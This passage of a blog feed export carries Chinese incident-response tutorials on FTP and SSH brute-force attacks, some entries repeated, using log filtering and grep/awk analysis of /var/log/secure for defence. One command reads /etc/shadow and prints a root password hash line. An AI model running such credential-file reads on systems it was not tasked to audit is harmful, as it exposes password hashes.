    <content type="html"><![CDATA[<h2 id="第04章-Windows实战篇">第04章: Windows实战篇</h2><p><a href="%E7%AC%AC1%E7%AF%87%EF%BC%9AFTP%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.md">第1篇：FTP暴力破解</a></p><p><a href="%E7%AC%AC2%E7%AF%87%EF%BC%9A%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92.md">第2篇：蠕虫病毒</a></p><p><a href="%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92.md">第3篇：勒索病毒</a></p><p><a href="%E7%AC%AC4%E7%AF%87%EF%BC%9AARP%E7%97%85%E6%AF%92.md">第4篇：ARP病毒</a></p><p><a href="%E7%AC%AC5%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%B8%80%EF%BC%89.md">第5篇：挖矿病毒（一）</a></p><p><a href="%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%BA%8C%EF%BC%89.md">第6篇：挖矿病毒（二）</a></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第04章：Windows实战篇第1篇：FTP暴力破解</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/d61eb2b.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/d61eb2b.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:26:24.687Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第1篇：FTP暴力破解">第1篇：FTP暴力破解</h2><h3 id="0x00-前言">0x00 前言</h3><p>​FTP是一个文件传输协议，用户通过FTP可从客户机程序向远程主机上传或下载文件，常用于网站代码维护、日常源码备份等。如果攻击者通过FTP匿名访问或者弱口令获取FTP权限，可直接上传webshell，进一步渗透提权，直至控制整个网站服务器。</p><h3 id="0x01-应急场景">0x01 应急场景</h3><p>​从昨天开始，网站响应速度变得缓慢，网站服务器登录上去非常卡，重启服务器就能保证一段时间的正常访问，网站响应状态时而飞快时而缓慢，多数时间是缓慢的。针对网站服务器异常，系统日志和网站日志，是我们排查处理的重点。查看Window安全日志，发现大量的登录失败记录：</p><p><img src="image/win-5-1.png" alt=""></p><h3 id="0x02-日志分析">0x02 日志分析</h3><p><strong>安全日志分析：</strong></p><p>安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么。</p><p>打开安全日志，在右边点击筛选当前日志， 在事件ID填入4625，查询到事件ID4625，事件数177007，从这个数据可以看出，服务器正则遭受暴力破解：</p><p><img src="image/win-5-2.png" alt=""></p><p>进一步使用Log Parser对日志提取数据分析，发现攻击者使用了大量的用户名进行爆破，例如用户名：fxxx，共计进行了17826次口令尝试，攻击者基于“fxxx”这样一个域名信息，构造了一系列的用户名字典进行有针对性进行爆破，如下图：</p><p><img src="image/win-5-3.png" alt=""></p><p>这里我们留意到登录类型为8，来了解一下登录类型8是什么意思呢？</p><p><strong>登录类型8：网络明文（NetworkCleartext）</strong></p><p>这种登录表明这是一个像类型3一样的网络登录，但是这种登录的密码在网络上是通过明文传输的，WindowsServer服务是不允许通过明文验证连接到共享文件夹或打印机的，据我所知只有当从一个使用Advapi的ASP脚本登录或者一个用户使用基本验证方式登录IIS才会是这种登录类型。“登录过程”栏都将列出Advapi。</p><p>我们推测可能是FTP服务，通过查看端口服务及管理员访谈，确认服务器确实对公网开放了FTP服务。</p><p><img src="image/win-5-4.png" alt=""></p><p>另外，日志并未记录暴力破解的IP地址，我们可以使用Wireshark对捕获到的流量进行分析，获取到正在进行爆破的IP：</p><p><img src="image/win-5-5.png" alt=""></p><p>通过对近段时间的管理员登录日志进行分析，如下：</p><p><img src="image/win-5-6.png" alt=""></p><p>管理员登录正常，并未发现异常登录时间和异常登录ip，这里的登录类型10，代表远程管理桌面登录。</p><p>另外，通过查看FTP站点，发现只有一个测试文件，与站点目录并不在同一个目录下面，进一步验证了FTP暴力破解并未成功。</p><p><img src="image/win-5-7.png" alt=""></p><p>应急处理措施：1、关闭外网FTP端口映射           2、删除本地服务器FTP测试</p><h3 id="0x04-处理措施">0x04 处理措施</h3><p>​FTP暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>、禁止使用FTP传输文件，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于<span class="number">8</span>位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。</span><br><span class="line"><span class="attribute">2</span>、更改服务器FTP默认端口。</span><br><span class="line"><span class="attribute">3</span>、部署入侵检测设备，增强安全防护。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第04章：Windows实战篇第1篇：FTP暴力破解</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/d61eb2b.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/d61eb2b.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:34:25.962Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第1篇：FTP暴力破解">第1篇：FTP暴力破解</h2><h3 id="0x00-前言">0x00 前言</h3><p>​FTP是一个文件传输协议，用户通过FTP可从客户机程序向远程主机上传或下载文件，常用于网站代码维护、日常源码备份等。如果攻击者通过FTP匿名访问或者弱口令获取FTP权限，可直接上传webshell，进一步渗透提权，直至控制整个网站服务器。</p><h3 id="0x01-应急场景">0x01 应急场景</h3><p>​从昨天开始，网站响应速度变得缓慢，网站服务器登录上去非常卡，重启服务器就能保证一段时间的正常访问，网站响应状态时而飞快时而缓慢，多数时间是缓慢的。针对网站服务器异常，系统日志和网站日志，是我们排查处理的重点。查看Window安全日志，发现大量的登录失败记录：</p><p><img src="image/win-5-1.png" alt=""></p><h3 id="0x02-日志分析">0x02 日志分析</h3><p><strong>安全日志分析：</strong></p><p>安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么。</p><p>打开安全日志，在右边点击筛选当前日志， 在事件ID填入4625，查询到事件ID4625，事件数177007，从这个数据可以看出，服务器正则遭受暴力破解：</p><p><img src="image/win-5-2.png" alt=""></p><p>进一步使用Log Parser对日志提取数据分析，发现攻击者使用了大量的用户名进行爆破，例如用户名：fxxx，共计进行了17826次口令尝试，攻击者基于“fxxx”这样一个域名信息，构造了一系列的用户名字典进行有针对性进行爆破，如下图：</p><p><img src="image/win-5-3.png" alt=""></p><p>这里我们留意到登录类型为8，来了解一下登录类型8是什么意思呢？</p><p><strong>登录类型8：网络明文（NetworkCleartext）</strong></p><p>这种登录表明这是一个像类型3一样的网络登录，但是这种登录的密码在网络上是通过明文传输的，WindowsServer服务是不允许通过明文验证连接到共享文件夹或打印机的，据我所知只有当从一个使用Advapi的ASP脚本登录或者一个用户使用基本验证方式登录IIS才会是这种登录类型。“登录过程”栏都将列出Advapi。</p><p>我们推测可能是FTP服务，通过查看端口服务及管理员访谈，确认服务器确实对公网开放了FTP服务。</p><p><img src="image/win-5-4.png" alt=""></p><p>另外，日志并未记录暴力破解的IP地址，我们可以使用Wireshark对捕获到的流量进行分析，获取到正在进行爆破的IP：</p><p><img src="image/win-5-5.png" alt=""></p><p>通过对近段时间的管理员登录日志进行分析，如下：</p><p><img src="image/win-5-6.png" alt=""></p><p>管理员登录正常，并未发现异常登录时间和异常登录ip，这里的登录类型10，代表远程管理桌面登录。</p><p>另外，通过查看FTP站点，发现只有一个测试文件，与站点目录并不在同一个目录下面，进一步验证了FTP暴力破解并未成功。</p><p><img src="image/win-5-7.png" alt=""></p><p>应急处理措施：1、关闭外网FTP端口映射           2、删除本地服务器FTP测试</p><h3 id="0x04-处理措施">0x04 处理措施</h3><p>​FTP暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>、禁止使用FTP传输文件，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于<span class="number">8</span>位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。</span><br><span class="line"><span class="attribute">2</span>、更改服务器FTP默认端口。</span><br><span class="line"><span class="attribute">3</span>、部署入侵检测设备，增强安全防护。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第05章：Linux实战篇第1篇：SSH暴力破解</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/e4068ec3.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/e4068ec3.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:34:25.963Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第1篇：SSH暴力破解">第1篇：SSH暴力破解</h2><h3 id="0x00-前言">0x00 前言</h3><p>​SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议，主要用于给远程登录会话数据进行加密，保证数据传输的安全。SSH口令长度太短或者复杂度不够，如仅包含数字，或仅包含字母等，容易被攻击者破解，一旦被攻击者获取，可用来直接登录系统，控制服务器所有权限。</p><h3 id="0x01-应急场景">0x01 应急场景</h3><p>​某天，网站管理员登录服务器进行巡检时，发现端口连接里存在两条可疑的连接记录，如下图：</p><p><img src="./image/linux-10-1.png" alt=""></p><ol><li><p>TCP初始化连接三次握手吧：发SYN包，然后返回SYN/ACK包，再发ACK包，连接正式建立。但是这里有点出入，当请求者收到SYS/ACK包后，就开始建立连接了，而被请求者第三次握手结束后才建立连接。</p></li><li><p>客户端TCP状态迁移：</p><p>​CLOSED-&gt;SYN_SENT-&gt;ESTABLISHED-&gt;FIN_WAIT_1-&gt;FIN_WAIT_2-&gt;TIME_WAIT-&gt;CLOSED</p><p>服务器TCP状态迁移：</p><p>​CLOSED-&gt;LISTEN-&gt;SYN recv-&gt;ESTABLISHED-&gt;CLOSE_WAIT-&gt;LAST_ACK-&gt;CLOSED</p></li><li><p>当客户端开始连接时，服务器还处于LISTENING，客户端发一个SYN包后，服务端接收到了客户端的SYN并且发送了ACK时，服务器处于SYN_RECV状态，然后并没有再次收到客户端的ACK进入ESTABLISHED状态，一直停留在SYN_RECV状态。</p><p>在这里，SSH（22）端口，两条外网IP的SYN_RECV状态连接，直觉告诉了管理员，这里一定有什么异常。</p></li></ol><h3 id="0x02-日志分析">0x02 日志分析</h3><p>​SSH端口异常，我们首先有必要先来了解一下系统账号情况：</p><p><strong>A、系统账号情况</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">、</span>除root之外，是否还有其它特权用户(uid 为<span class="number">0</span>)</span><br><span class="line">[root<span class="meta">@localhost</span> <span class="operator">~</span>]# awk <span class="operator">-</span><span class="type">F</span>: &#x27;<span class="variable">$3</span><span class="operator">==</span><span class="number">0</span>&#123;print <span class="variable">$1</span>&#125;&#x27; <span class="regexp">/etc/</span>passwd</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="operator">、</span>可以远程登录的帐号信息</span><br><span class="line">[root<span class="meta">@localhost</span> <span class="operator">~</span>]# awk &#x27;<span class="regexp">/\$1|\$6/</span>&#123;print <span class="variable">$1</span>&#125;&#x27; <span class="regexp">/etc/</span>shadow</span><br><span class="line">root:<span class="variable">$6</span><span class="variable">$38</span>cKfZDjsTiUe58V<span class="variable">$FP</span>.<span class="type">UHWMObqeUQS1Z2KRj</span><span class="regexp">/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./</span>qK12HN8jFuXOfEYIKLID6hq0::<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br></pre></td></tr></table></figure><p>我们可以确认目前系统只有一个管理用户root。</p><p>接下来，我们想到的是/var/log/secure，这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录下来。</p><p><strong>B、确认攻击情况：</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1、统计了下日志，发现大约有126254次登录失败的记录，确认服务器遭受暴力破解</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep -o <span class="string">&quot;Failed password&quot;</span> /var/log/secure|uniq -c</span><br><span class="line">     126254 Failed password</span><br><span class="line">     </span><br><span class="line">2、输出登录爆破的第一行和最后一行，确认爆破时间范围：</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|head -1</span><br><span class="line">Jul  8 20:14:59 localhost sshd<span class="comment">[14323]</span>: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|tail -1</span><br><span class="line">Jul 10 12:37:21 localhost sshd<span class="comment">[2654]</span>: Failed password for root from 111.13.xxx.xxx port 13068 ssh2</span><br><span class="line"></span><br><span class="line">3、进一步定位有哪些IP在爆破？</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|grep -E -o <span class="string">&quot;(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)\.(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)\.(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)\.(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)&quot;</span>|uniq -c | sort -nr </span><br><span class="line">    12622 23.91.xxx.xxx</span><br><span class="line">     8942 114.104.xxx.xxx</span><br><span class="line">     8122 111.13.xxx.xxx</span><br><span class="line">     7525 123.59.xxx.xxx</span><br><span class="line">     ...................</span><br><span class="line">    </span><br><span class="line">4、爆破用户名字典都有哪些？</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print <span class="string">&quot;$1\n&quot;</span>;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line">      9402  root</span><br><span class="line">      3265  invalid user oracle</span><br><span class="line">      1245  invalid user admin</span><br><span class="line">      1025  invalid user user</span><br><span class="line">      .....................</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>C、管理员最近登录情况：</strong></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、登录成功的日期、用户名、IP：</span><br><span class="line">[root<span class="meta">@localhost</span> ~]# grep <span class="string">&quot;Accepted &quot;</span> /<span class="keyword">var</span>/log/secure | awk <span class="string">&#x27;&#123;print <span class="subst">$1</span>,<span class="subst">$2</span>,<span class="subst">$3</span>,<span class="subst">$9</span>,<span class="subst">$11</span>&#125;&#x27;</span> </span><br><span class="line">Jul <span class="number">9</span> <span class="number">09</span>:<span class="number">38</span>:<span class="number">09</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">Jul <span class="number">9</span> <span class="number">14</span>:<span class="number">55</span>:<span class="number">51</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">Jul <span class="number">10</span> <span class="number">08</span>:<span class="number">54</span>:<span class="number">26</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">Jul <span class="number">10</span> <span class="number">16</span>:<span class="number">25</span>:<span class="number">59</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">............................</span><br><span class="line">通过登录日志分析，并未发现异常登录时间和登录IP。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、顺便统计一下登录成功的IP有哪些：</span><br><span class="line">[root<span class="meta">@localhost</span> ~]# grep <span class="string">&quot;Accepted &quot;</span> /<span class="keyword">var</span>/log/secure | awk <span class="string">&#x27;&#123;print <span class="subst">$11</span>&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line">     <span class="number">27</span> <span class="number">192.168</span><span class="number">.204</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>通过日志分析，发现攻击者使用了大量的用户名进行暴力破解，但从近段时间的系统管理员登录记录来看，并未发现异常登录的情况，需要进一步对网站服务器进行入侵排查，这里就不再阐述。</p><h3 id="0x04-处理措施">0x04 处理措施</h3><p>​SSH暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>、禁止向公网开放管理端口，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于<span class="number">8</span>位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。</span><br><span class="line"><span class="attribute">2</span>、更改服务器ssh默认端口。</span><br><span class="line"><span class="attribute">3</span>、部署入侵检测设备，增强安全防护。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第05章：Linux实战篇第1篇：SSH暴力破解</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/e4068ec3.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/e4068ec3.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:26:24.697Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第1篇：SSH暴力破解">第1篇：SSH暴力破解</h2><h3 id="0x00-前言">0x00 前言</h3><p>​SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议，主要用于给远程登录会话数据进行加密，保证数据传输的安全。SSH口令长度太短或者复杂度不够，如仅包含数字，或仅包含字母等，容易被攻击者破解，一旦被攻击者获取，可用来直接登录系统，控制服务器所有权限。</p><h3 id="0x01-应急场景">0x01 应急场景</h3><p>​某天，网站管理员登录服务器进行巡检时，发现端口连接里存在两条可疑的连接记录，如下图：</p><p><img src="./image/linux-10-1.png" alt=""></p><ol><li><p>TCP初始化连接三次握手吧：发SYN包，然后返回SYN/ACK包，再发ACK包，连接正式建立。但是这里有点出入，当请求者收到SYS/ACK包后，就开始建立连接了，而被请求者第三次握手结束后才建立连接。</p></li><li><p>客户端TCP状态迁移：</p><p>​CLOSED-&gt;SYN_SENT-&gt;ESTABLISHED-&gt;FIN_WAIT_1-&gt;FIN_WAIT_2-&gt;TIME_WAIT-&gt;CLOSED</p><p>服务器TCP状态迁移：</p><p>​CLOSED-&gt;LISTEN-&gt;SYN recv-&gt;ESTABLISHED-&gt;CLOSE_WAIT-&gt;LAST_ACK-&gt;CLOSED</p></li><li><p>当客户端开始连接时，服务器还处于LISTENING，客户端发一个SYN包后，服务端接收到了客户端的SYN并且发送了ACK时，服务器处于SYN_RECV状态，然后并没有再次收到客户端的ACK进入ESTABLISHED状态，一直停留在SYN_RECV状态。</p><p>在这里，SSH（22）端口，两条外网IP的SYN_RECV状态连接，直觉告诉了管理员，这里一定有什么异常。</p></li></ol><h3 id="0x02-日志分析">0x02 日志分析</h3><p>​SSH端口异常，我们首先有必要先来了解一下系统账号情况：</p><p><strong>A、系统账号情况</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">、</span>除root之外，是否还有其它特权用户(uid 为<span class="number">0</span>)</span><br><span class="line">[root<span class="meta">@localhost</span> <span class="operator">~</span>]# awk <span class="operator">-</span><span class="type">F</span>: &#x27;<span class="variable">$3</span><span class="operator">==</span><span class="number">0</span>&#123;print <span class="variable">$1</span>&#125;&#x27; <span class="regexp">/etc/</span>passwd</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="operator">、</span>可以远程登录的帐号信息</span><br><span class="line">[root<span class="meta">@localhost</span> <span class="operator">~</span>]# awk &#x27;<span class="regexp">/\$1|\$6/</span>&#123;print <span class="variable">$1</span>&#125;&#x27; <span class="regexp">/etc/</span>shadow</span><br><span class="line">root:<span class="variable">$6</span><span class="variable">$38</span>cKfZDjsTiUe58V<span class="variable">$FP</span>.<span class="type">UHWMObqeUQS1Z2KRj</span><span class="regexp">/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./</span>qK12HN8jFuXOfEYIKLID6hq0::<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br></pre></td></tr></table></figure><p>我们可以确认目前系统只有一个管理用户root。</p><p>接下来，我们想到的是/var/log/secure，这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录下来。</p><p><strong>B、确认攻击情况：</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1、统计了下日志，发现大约有126254次登录失败的记录，确认服务器遭受暴力破解</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep -o <span class="string">&quot;Failed password&quot;</span> /var/log/secure|uniq -c</span><br><span class="line">     126254 Failed password</span><br><span class="line">     </span><br><span class="line">2、输出登录爆破的第一行和最后一行，确认爆破时间范围：</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|head -1</span><br><span class="line">Jul  8 20:14:59 localhost sshd<span class="comment">[14323]</span>: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|tail -1</span><br><span class="line">Jul 10 12:37:21 localhost sshd<span class="comment">[2654]</span>: Failed password for root from 111.13.xxx.xxx port 13068 ssh2</span><br><span class="line"></span><br><span class="line">3、进一步定位有哪些IP在爆破？</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|grep -E -o <span class="string">&quot;(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)\.(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)\.(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)\.(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)&quot;</span>|uniq -c | sort -nr </span><br><span class="line">    12622 23.91.xxx.xxx</span><br><span class="line">     8942 114.104.xxx.xxx</span><br><span class="line">     8122 111.13.xxx.xxx</span><br><span class="line">     7525 123.59.xxx.xxx</span><br><span class="line">     ...................</span><br><span class="line">    </span><br><span class="line">4、爆破用户名字典都有哪些？</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print <span class="string">&quot;$1\n&quot;</span>;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line">      9402  root</span><br><span class="line">      3265  invalid user oracle</span><br><span class="line">      1245  invalid user admin</span><br><span class="line">      1025  invalid user user</span><br><span class="line">      .....................</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>C、管理员最近登录情况：</strong></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、登录成功的日期、用户名、IP：</span><br><span class="line">[root<span class="meta">@localhost</span> ~]# grep <span class="string">&quot;Accepted &quot;</span> /<span class="keyword">var</span>/log/secure | awk <span class="string">&#x27;&#123;print <span class="subst">$1</span>,<span class="subst">$2</span>,<span class="subst">$3</span>,<span class="subst">$9</span>,<span class="subst">$11</span>&#125;&#x27;</span> </span><br><span class="line">Jul <span class="number">9</span> <span class="number">09</span>:<span class="number">38</span>:<span class="number">09</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">Jul <span class="number">9</span> <span class="number">14</span>:<span class="number">55</span>:<span class="number">51</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">Jul <span class="number">10</span> <span class="number">08</span>:<span class="number">54</span>:<span class="number">26</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">Jul <span class="number">10</span> <span class="number">16</span>:<span class="number">25</span>:<span class="number">59</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">............................</span><br><span class="line">通过登录日志分析，并未发现异常登录时间和登录IP。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、顺便统计一下登录成功的IP有哪些：</span><br><span class="line">[root<span class="meta">@localhost</span> ~]# grep <span class="string">&quot;Accepted &quot;</span> /<span class="keyword">var</span>/log/secure | awk <span class="string">&#x27;&#123;print <span class="subst">$11</span>&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line">     <span class="number">27</span> <span class="number">192.168</span><span class="number">.204</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>通过日志分析，发现攻击者使用了大量的用户名进行暴力破解，但从近段时间的系统管理员登录记录来看，并未发现异常登录的情况，需要进一步对网站服务器进行入侵排查，这里就不再阐述。</p><h3 id="0x04-处理措施">0x04 处理措施</h3><p>​SSH暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 